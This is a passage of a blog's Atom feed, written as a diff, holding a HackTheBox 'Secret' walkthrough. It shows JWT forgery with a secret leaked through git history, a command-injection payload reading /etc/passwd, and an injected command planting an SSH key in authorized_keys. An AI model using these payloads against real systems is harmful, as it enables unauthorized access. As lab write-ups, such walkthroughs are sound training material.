@@ -1,0 +1,827 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-16T21:52:55-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jennifer Reeves</title><subtitle>IT Security Enthusiast</subtitle><entry><title type="html">HackTheBox - Secret</title><link href="http://localhost:4000/HTB-Secret/" rel="alternate" type="text/html" title="HackTheBox - Secret" /><published>2022-03-15T00:00:00-04:00</published><updated>2022-03-15T00:00:00-04:00</updated><id>http://localhost:4000/HTB-Secret</id><content type="html" xml:base="http://localhost:4000/HTB-Secret/">&lt;p&gt;&lt;em&gt;Can you keep a secret?&lt;/em&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;RustScan w/ Nmap&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  PORT     STATE SERVICE REASON  VERSION
+  22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
+  | ssh-hostkey: 
+  |   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
+  |   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
+  |   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
+
+  80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
+  |_http-title: DUMB Docs
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+  |_http-server-header: nginx/1.18.0 (Ubuntu)
+
+  3000/tcp open  http    syn-ack Node.js (Express middleware)
+  |_http-title: DUMB Docs
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Gobuster&lt;/p&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
+  └─$ gobuster dir -u 10.10.11.120 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js | tee gobuster_php.log
+  ===============================================================
+  Gobuster v3.1.0
+  by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.10.11.120
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.1.0
+  [+] Extensions:              php,html,txt,js
+  [+] Timeout:                 10s
+  ===============================================================
+  2022/03/14 20:54:37 Starting gobuster in directory enumeration mode
+  ===============================================================
+  /download             (Status: 301) [Size: 183] [--&amp;gt; /download/]
+  /docs                 (Status: 200) [Size: 20720]               
+  /assets               (Status: 301) [Size: 179] [--&amp;gt; /assets/]  
+  /api                  (Status: 200) [Size: 93]                  
+  /Docs                 (Status: 200) [Size: 20720]               
+  /API                  (Status: 200) [Size: 93]                  
+  /DOCS                 (Status: 200) [Size: 20720]               
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;2-website&quot;&gt;2. Website&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;“DUMBDocs”&lt;/li&gt;
+  &lt;li&gt;An API based authentication system using JWT tokens.&lt;/li&gt;
+  &lt;li&gt;Node.js based&lt;/li&gt;
+  &lt;li&gt;Can register new users through API system&lt;/li&gt;
+  &lt;li&gt;Downloaded Source Code&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-source-code&quot;&gt;3. Source Code&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Unzipped files.zip&lt;/li&gt;
+  &lt;li&gt;Looked at several .js files - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local-web/index.js&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local-web/routes/private.js&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local-web/routes/verifytoken.js&lt;/code&gt;, etc.&lt;/li&gt;
+  &lt;li&gt;Got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theadmin&lt;/code&gt; username from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local-web/routes/private.js&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verifytoken.js&lt;/code&gt; shows that no encryption algorithm is specified (possible to change?)&lt;/li&gt;
+  &lt;li&gt;Two hidden items in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local-web&lt;/code&gt; - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; has the Token &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; in it!
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+  └─$ ls -la
+  total 116
+  drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  3  2021 .
+  drwxr-xr-x   3 acousticgirl acousticgirl  4096 Mar 14 22:22 ..
+  -rw-rw-r--   1 acousticgirl acousticgirl    72 Sep  3  2021 .env
+  drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  8  2021 .git
+  -rw-rw-r--   1 acousticgirl acousticgirl   885 Sep  3  2021 index.js
+  drwxrwxr-x   2 acousticgirl acousticgirl  4096 Aug 13  2021 model
+  drwxrwxr-x 201 acousticgirl acousticgirl  4096 Aug 13  2021 node_modules
+  -rw-rw-r--   1 acousticgirl acousticgirl   491 Aug 13  2021 package.json
+  -rw-rw-r--   1 acousticgirl acousticgirl 69452 Aug 13  2021 package-lock.json
+  drwxrwxr-x   4 acousticgirl acousticgirl  4096 Sep  3  2021 public
+  drwxrwxr-x   2 acousticgirl acousticgirl  4096 Sep  3  2021 routes
+  drwxrwxr-x   4 acousticgirl acousticgirl  4096 Aug 13  2021 src
+  -rw-rw-r--   1 acousticgirl acousticgirl   651 Aug 13  2021 validations.js
+                                                                                                                                                                             
+  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+  └─$ cat .env               
+  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+  *TOKEN_SECRET = secret*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;4-action-plan&quot;&gt;4. Action Plan&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Two possible routes
+    &lt;ul&gt;
+      &lt;li&gt;&lt;em&gt;Plan 1&lt;/em&gt; - Try to do a user replacement by creating a second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theadmin&lt;/code&gt; user
+        &lt;ul&gt;
+          &lt;li&gt;Try to find place to upload a reverse shell&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;em&gt;Plan 2&lt;/em&gt; - Create low level user and escalate privileges
+        &lt;ul&gt;
+          &lt;li&gt;Once created, alter JWT to try to login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theadmin&lt;/code&gt;&lt;/li&gt;
+          &lt;li&gt;Try to find place to upload a reverse shell&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;5-plan-1-from-outer-spaaaaaace&quot;&gt;5. Plan 1 (from outer spaaaaaace!)&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Attempted user replacement
+    &lt;ul&gt;
+      &lt;li&gt;Attempt
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl -i -X POST \
+-H 'Content-Type: application/json' \
+-d '{&quot;name&quot;:&quot; theadmin&quot;, &quot;email&quot;:&quot;drt@dasith.works&quot;, &quot;password&quot;:&quot;testpassword&quot;}' \
+http://10.10.11.120/api/user/register
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;Success! (but not really)&lt;/p&gt;
+
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  HTTP/1.1 200 OK
+  Server: nginx/1.18.0 (Ubuntu)
+  Date: Tue, 15 Mar 2022 01:59:53 GMT
+  Content-Type: application/json; charset=utf-8
+  Content-Length: 20
+  Connection: keep-alive
+  X-Powered-By: Express
+  ETag: W/&quot;14-LWrfBFPQd+iUl+P35I+Rt9MzQss&quot;
+
+  {&quot;user&quot;:&quot; theadmin&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+      &lt;li&gt;The user was created but it is ` theadmin&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; and not &lt;/code&gt;theadmin` (notice the leading space). However, they both use the same email address.
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl -i -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;email&quot;:&quot;drt@dasith.works&quot;, &quot;password&quot;:&quot;testpassword&quot;}' \
+  http://10.10.11.120/api/user/login
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;Successfully logged in with ` theadmin` email and got our JWT:&lt;/p&gt;
+
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  HTTP/1.1 200 OK
+  Server: nginx/1.18.0 (Ubuntu)
+  Date: Tue, 15 Mar 2022 02:04:48 GMT
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 211
+  Connection: keep-alive
+  X-Powered-By: Express
+  auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls
+  ETag: W/&quot;d3-AbKQ3P+XBBjA9PHtvEjPlyeZqFA&quot;
+
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;6-plan-2&quot;&gt;6. Plan 2&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Low level user creation (achieved in Step 5)&lt;/li&gt;
+  &lt;li&gt;Let’s alter our username in the JWT at https://jwt.io and sign it with our secret key
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Lets test our token
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl -X POST http://10.10.11.120:3000/api/user/login
+ -H &quot;Authorization: Bearer {eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw}&quot;
+ -d ‘{“email”:”drt@dasiths.works”,”password”:”testpassword”}’
+
+ ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+ └─$ curl -i http://10.10.11.120:3000/api/priv 
+ HTTP/1.1 401 Unauthorized
+ X-Powered-By: Express
+ Content-Type: text/html; charset=utf-8
+ Content-Length: 13
+ ETag: W/&quot;d-Fke522wB/f0WEQT+w6CDKWhElh4&quot;
+ Date: Tue, 15 Mar 2022 03:41:39 GMT
+ Connection: keep-alive
+
+ Access Denied         
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Access is still denied so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; must not be the correct key for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theadmin&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;7-back-to-the-source-code&quot;&gt;7. Back to the Source Code&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Digging into the source code, there’s a hidden &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; folder&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Let’s look at the git logs to see if anything changed&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
+  └─$ git log                                         
+  commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&amp;gt; master)
+  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
+  Date:   Thu Sep 9 00:03:27 2021 +0530
+
+      now we can view logs from server 😃
+
+  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
+  Date:   Fri Sep 3 11:30:17 2021 +0530
+
+      removed .env for security reasons
+
+  commit de0a46b5107a2f4d26e348303e76d85ae4870934
+  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
+  Date:   Fri Sep 3 11:29:19 2021 +0530
+
+      added /downloads
+
+  commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
+  Date:   Fri Sep 3 11:27:35 2021 +0530
+
+      removed swap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;This line looks promising - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;removed .env for security reasons&lt;/code&gt; so lets look at that commit&lt;/p&gt;
+
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+  └─$ git log -p  -- .env    
+  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
+  Date:   Fri Sep 3 11:30:17 2021 +0530
+
+      removed .env for security reasons
+
+  diff --git a/.env b/.env
+  index fb6f587..31db370 100644
+  --- a/.env
+  +++ b/.env
+  @@ -1,2 +1,2 @@
+  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+  -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+  +TOKEN_SECRET = secret
+
+  commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+  Author: dasithsv &amp;lt;dasithsv@gmail.com&amp;gt;
+  Date:   Fri Sep 3 11:25:52 2021 +0530
+
+      first commit
+
+  diff --git a/.env b/.env
+  new file mode 100644
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;It looks like the key was set to
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;Lets go back to https://jwt.io and use that as the secret key (instead of &lt;em&gt;secret&lt;/em&gt;)&lt;/li&gt;
+      &lt;li&gt;New token
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.U2kHzOJQZLIX8YzMvyx-Bsl4-7FLFDSfedr7vGXYh6U
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Testing the new token
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  curl http://10.10.11.120:3000/api/priv   -H &quot;auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;SUCCESS!&lt;/strong&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+ └─$ curl http://10.10.11.120:3000/api/priv   -H &quot;auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU&quot;
+ {&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}     
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;8-abusing-apilogs&quot;&gt;8. Abusing /api/logs&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You can query http://10.10.11.120/api/logs as admin and execute commands through index.js which includes an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec()&lt;/code&gt; call.&lt;/li&gt;
+  &lt;li&gt;Requests must be URL encoded (I used https://gchq.github.io/CyberChef/ for this)&lt;/li&gt;
+  &lt;li&gt;You can run the following request to read /etc/passwd
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Reading /etc/passwd gives you the name of the non-standard user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dasith&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;9-gaining-ssh&quot;&gt;9. Gaining SSH&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Generate a new ssh key for this challenge and label it secret.htb
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  - -C is the comment
+  - -t is the type
+  - -b is the bytes
+  - -f is the file name
+  - -P is the password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Set your secret.htb file to be your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$PUBLIC_KEY&lt;/code&gt;
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export PUBLIC_KEY=$(cat secret.htb.pub)&lt;/code&gt;
+      - You &lt;strong&gt;must&lt;/strong&gt; do this step&lt;/li&gt;
+  &lt;li&gt;Craft a GET request that adds your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$PUBLIC_KEY&lt;/code&gt; contents to /home/dasith/.ssh/authorized_keys on the target machine
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
+  └─$ curl \
+  &amp;gt; -i \
+  &amp;gt; -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU' \
+  &amp;gt; -G \
+  &amp;gt; --data-urlencode &quot;file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY &amp;gt;&amp;gt; /home/dasith/.ssh/authorized_keys&quot; \
+  &amp;gt; 'http://10.10.11.120/api/logs'
+  HTTP/1.1 200 OK
+  Server: nginx/1.18.0 (Ubuntu)
+  Date: Tue, 15 Mar 2022 18:28:33 GMT
+  Content-Type: application/json; charset=utf-8
+  Content-Length: 27
+  Connection: keep-alive
+  X-Powered-By: Express
+  ETag: W/&quot;1b-pFfOEX46IRaNi6v8ztcwIwl9EF8&quot;
+
+  &quot;ab3e953 Added the codes\n&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Login with SSH
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ssh -i secret.htb dasith@10.10.11.120
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;10-user-flag&quot;&gt;10. User Flag&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```
+cat user.txt
+d##############################d
+```
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;11-gaining-root-path-1---coredump&quot;&gt;11. Gaining Root (Path 1 - CoreDump)&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;There are two paths to gaining root on this box. This is the way the creators of the box intended you to root the box.&lt;/li&gt;
+  &lt;li&gt;Enumerate common directories either manually or with linpeas (I chose linpeas)
+    &lt;ul&gt;
+      &lt;li&gt;Get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; onto the box, chmod it, and run&lt;/li&gt;
+      &lt;li&gt;You will find a file that has a SUID bit set as root (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/count&lt;/code&gt;)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Try the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/count&lt;/code&gt; program
+    &lt;ul&gt;
+      &lt;li&gt;It’s like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wc&lt;/code&gt; and can save to a file&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
